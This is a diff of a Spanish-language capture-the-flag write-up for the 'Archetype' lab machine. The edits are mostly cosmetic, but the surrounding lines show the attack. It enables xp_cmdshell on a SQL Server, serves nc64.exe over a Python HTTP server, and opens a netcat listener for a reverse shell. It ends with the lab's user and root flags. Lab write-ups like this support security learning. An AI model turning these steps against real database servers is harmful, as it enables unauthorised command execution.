@@ -28,27 +28,8 @@ sudo nmap -sCV --min-rate 5000 -A -vvv -Pn -n -p 1433,139,445 -oN mainports $IP
 ```
 
 1433/tcp open  ms-sql-s     syn-ack ttl 128 Microsoft SQL Server 2017 14.00.1000.00; RTM
-| ms-sql-ntlm-info: 
-|   Target_Name: ARCHETYPE
-|   NetBIOS_Domain_Name: ARCHETYPE
-|   NetBIOS_Computer_Name: ARCHETYPE
-|   DNS_Domain_Name: Archetype
-|   DNS_Computer_Name: Archetype
-|_  Product_Version: 10.0.17763
-| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
-| Issuer: commonName=SSL_Self_Signed_Fallback
-| Public Key type: rsa
-| Public Key bits: 2048
-| Signature Algorithm: sha256WithRSAEncryption
-| Not valid before: 2022-04-15T14:07:35
-| Not valid after:  2052-04-15T14:07:35
-| MD5:   01b1 a439 ed24 1acd b23c 0a93 5f56 d65d
-| SHA-1: ef69 46fa 4758 c842 b313 2728 1f41 4aa6 73f0 a0e5
-|
-|_ssl-date: 2022-04-15T14:17:15+00:00; 0s from scanner time.
 
-
-el puerto que buscamos es el 1433
+El puerto que buscamos es el 1433
 
 ## [](#header-3) 2) What is the name of the non-Administrative share available over SMB?
 
@@ -126,25 +107,19 @@ SELECT name FROM SYSOBJECTS WHERE xtype = 'U';
 SELECT * FROM INFORMATION_SCHEMA.TABLES;
 
 Las tablas que tiene la base de datos master son:
-1) spt_fallback_db
-2) spt_fallback_dev
-3) spt_fallback_usg
-4) spt_values
-5) spt_monitor
-6) MS_replication_options 
 
-SELECT * FROM TableName
+```
+spt_fallback_db
+spt_fallback_dev
+spt_fallback_usg
+spt_values
+spt_monitor
+MS_replication_options 
+```
 
-TABLAS 1, 2, 3: están vacias
+Tras estar un rato mirando las bases de datos llego a la conclusion de que no hay nada interesante en ellas.
 
-La tabla 4 tiene muchísimas columnas, las más llamativas son: DB Owners, DB Access Administrators, DB Security Administrators, DB DDL Administrators  
-WINDOWS/NT, WINDOWS LOGIN, CERTIFICATE, SQL USER, WINDOWS USER, LOGIN, WINDOWS LOGIN,
-
-TABLA 5: parece vacía
-
-TABLA 6: tiene 3 columnas, transactional, merge, security_model, pero al hacer SELECT merge FROM MSreplication_options no me deja sacar información
-
-Leyendo hacktricks he visto que se puede habilitar el xp_cmdshell, asi que:
+Leyendo hacktricks he visto que se puede habilitar el xp_cmdshell, así que:
 
 ```
 sp_configure 'show advanced options', '1'
@@ -157,14 +132,14 @@ EXEC master..xp_cmdshell 'whoami'
 -> archetype\sql_svc
 ```
 
-A partir de ahora tengo que mirar el walkthrough
+A partir de ahora tengo que mirar el walkthrough.
 
 El objetivo es establecer una reverse shell. Descargaremos nc64.exe y en esa carpeta, ejecutaremos el siguiente comando: 
 
 ```
 sudo python3 -m http.server 80
 ```
-Así abrimos el puerto 80 para poder conectarnos a nuestro ordenador desde la consola de la maquina que esta hosteando la base de datos
+Así abrimos el puerto 80 para poder conectarnos a nuestro ordenador desde la consola de la maquina que esta hosteando la base de datos.
 
 Usaremos netcat para escuchar por el puerto 443:
 
@@ -172,7 +147,7 @@ Usaremos netcat para escuchar por el puerto 443:
 sudo nc -lvnp 443
 ```
 
-Mi direccion ip es esta 10.10.14.110
+Mi direccion IP es esta: 10.10.14.110.
 
 Así que si desde la ventana de sql hacemos:
 
@@ -190,7 +165,7 @@ type user.txt
 ```
 
 ```
-3e7b102e78218e935bf3f4951fec21a3
+user=3e7b102e78218e935bf3f4951fec21a3
 ```
 
 ```
@@ -213,6 +188,7 @@ cd C:\Users\Administrator\Desktop
 dir
 type root.txt
 ```
+
 ```
-b91ccec3305e98240082d4474b848528
+root=b91ccec3305e98240082d4474b848528
 ```
